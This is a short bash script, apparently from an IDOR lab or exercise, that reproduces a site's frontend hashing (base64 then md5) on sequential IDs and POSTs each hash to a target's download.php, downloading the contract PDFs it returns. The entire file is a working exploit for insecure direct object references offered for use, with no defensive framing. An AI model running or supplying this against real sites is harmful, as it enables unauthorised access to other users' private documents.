#!/bin/bash

# Description: Enumerates IDOR-protected files by reversing frontend hashing logic (base64 + md5)
# Usage: ./idor-hash-enum-downloader.sh http://TARGET

url=$1

if [ -z "$url" ]; then
    echo "Usage: $0 http://TARGET"
    exit 1
fi

for i in {1..10}; do
    echo "[+] Processing ID: $i"

    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')

    curl -s -X POST \
        -d "contract=$hash" \
        "$url/download.php" \
        -o "contract_$hash.pdf"

done

echo "[+] Done."
